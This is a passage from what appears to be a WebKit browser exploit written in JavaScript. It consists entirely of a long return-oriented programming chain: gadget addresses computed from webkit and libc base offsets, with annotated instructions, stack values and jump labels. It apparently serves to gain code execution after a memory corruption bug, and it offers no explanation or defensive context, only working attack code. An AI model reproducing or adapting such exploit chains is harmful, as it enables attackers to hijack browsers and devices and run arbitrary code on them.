webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+89440, //L593
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L592:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L593:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L594:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+89528, //L595
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L595:
db([0, 0]); // 0x0
set_gadgets([
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+89584, //L597
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L597:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+89696, //L601
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L599:
db([1, 0]); // 0x1
set_gadget(libc_base+772328,); //pop rcx
//L600:
db([8, 0]); // 0x8
set_gadget(webkit_base+3789839,); //pop r11
//L601:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+1537212, //imul rax, rcx
libc_base+713278, //pop rsi
ropchain+89776, //L602
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+89792, //L603
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L602:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L603:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+764700, //add rax, rcx
libc_base+713278, //pop rsi
ropchain+89880, //L604
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L604:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+89936, //L606
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L606:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+90008, //L608
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L608:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+90064, //L610
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L610:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2989859, //mov [rax], rcx
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+90168, //L613
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L612:
db([16, 0]); // 0x10
set_gadget(libc_base+772328,); //pop rcx
//L613:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+90272, //L616
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+90256, //L615
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L615:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L616:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+90416, //L620
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+90384, //L618
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+90400, //L619
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L618:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L619:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L620:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+90488, //L621
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L621:
db([0, 0]); // 0x0
set_gadgets([
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+90544, //L623
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L623:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+90656, //L627
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L625:
db([8, 0]); // 0x8
set_gadget(libc_base+772328,); //pop rcx
//L626:
db([8, 0]); // 0x8
set_gadget(webkit_base+3789839,); //pop r11
//L627:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+1537212, //imul rax, rcx
libc_base+713278, //pop rsi
ropchain+90736, //L628
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+90752, //L629
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L628:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L629:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+764700, //add rax, rcx
libc_base+713278, //pop rsi
ropchain+90840, //L630
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L630:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+90896, //L632
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L632:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+91016, //L635
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L634:
db([16, 0]); // 0x10
set_gadget(libc_base+772328,); //pop rcx
//L635:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+91120, //L638
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+91104, //L637
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L637:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L638:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+91264, //L642
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+91232, //L640
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+91248, //L641
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L640:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L641:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L642:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+91336, //L643
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L643:
db([0, 0]); // 0x0
set_gadgets([
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+91392, //L645
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L645:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+91504, //L649
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L647:
db([7, 0]); // 0x7
set_gadget(libc_base+772328,); //pop rcx
//L648:
db([8, 0]); // 0x8
set_gadget(webkit_base+3789839,); //pop r11
//L649:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+1537212, //imul rax, rcx
libc_base+713278, //pop rsi
ropchain+91584, //L650
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+91600, //L651
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L650:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L651:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+764700, //add rax, rcx
libc_base+713278, //pop rsi
ropchain+91688, //L652
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L652:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+91744, //L654
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L654:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+91816, //L656
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L656:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+91872, //L658
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L658:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2989859, //mov [rax], rcx
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+91976, //L661
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L660:
db([40, 0]); // 0x28
set_gadget(libc_base+772328,); //pop rcx
//L661:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+92080, //L664
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+92064, //L663
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L663:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L664:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+92224, //L668
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+92192, //L666
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+92208, //L667
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L666:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L667:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L668:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+92320, //L670
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L669:
db([16, 0]); // 0x10
set_gadget(libc_base+772328,); //pop rcx
//L670:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+92424, //L673
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+92408, //L672
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L672:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L673:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+92568, //L677
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+92536, //L675
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+92552, //L676
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L675:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L676:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L677:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+92640, //L678
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L678:
db([0, 0]); // 0x0
set_gadgets([
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+92696, //L680
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L680:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+92808, //L684
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L682:
db([8, 0]); // 0x8
set_gadget(libc_base+772328,); //pop rcx
//L683:
db([8, 0]); // 0x8
set_gadget(webkit_base+3789839,); //pop r11
//L684:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+1537212, //imul rax, rcx
libc_base+713278, //pop rsi
ropchain+92888, //L685
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+92904, //L686
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L685:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L686:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+764700, //add rax, rcx
libc_base+713278, //pop rsi
ropchain+92992, //L687
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L687:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+93048, //L689
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L689:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+93120, //L691
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L691:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+93176, //L693
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L693:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2989859, //mov [rax], rcx
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
//L695:
libc_base+768796, //pop rax
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+93328, //L697
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L696:
db([16, 0]); // 0x10
set_gadget(libc_base+772328,); //pop rcx
//L697:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+93432, //L700
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+93416, //L699
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L699:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L700:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+93576, //L704
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+93544, //L702
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+93560, //L703
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L702:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L703:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L704:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+93648, //L705
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L705:
db([0, 0]); // 0x0
set_gadgets([
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+93704, //L707
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L707:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+93816, //L711
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L709:
db([9, 0]); // 0x9
set_gadget(libc_base+772328,); //pop rcx
//L710:
db([8, 0]); // 0x8
set_gadget(webkit_base+3789839,); //pop r11
//L711:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+1537212, //imul rax, rcx
libc_base+713278, //pop rsi
ropchain+93896, //L712
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+93912, //L713
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L712:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L713:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+764700, //add rax, rcx
libc_base+713278, //pop rsi
ropchain+94000, //L714
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L714:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+94056, //L716
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L716:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+94128, //L718
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L718:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+94184, //L720
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L720:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2989859, //mov [rax], rcx
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+94288, //L723
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L722:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+772328,); //pop rcx
//L723:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+94392, //L726
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+94376, //L725
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L725:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L726:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+94536, //L730
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+94504, //L728
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+94520, //L729
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L728:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L729:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L730:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+94608, //L731
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L731:
db([0, 0]); // 0x0
set_gadgets([
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+94664, //L733
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L733:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+94776, //L737
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L735:
db([6, 0]); // 0x6
set_gadget(libc_base+772328,); //pop rcx
//L736:
db([8, 0]); // 0x8
set_gadget(webkit_base+3789839,); //pop r11
//L737:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+1537212, //imul rax, rcx
libc_base+713278, //pop rsi
ropchain+94856, //L738
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+94872, //L739
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L738:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L739:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+844101, //sub rax, rcx ; sbb rdx, rcx
libc_base+713278, //pop rsi
ropchain+94960, //L740
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L740:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+95016, //L742
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L742:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+95136, //L745
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L744:
db([16, 0]); // 0x10
set_gadget(libc_base+772328,); //pop rcx
//L745:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+95240, //L748
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+95224, //L747
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L747:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L748:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+95384, //L752
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+95352, //L750
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
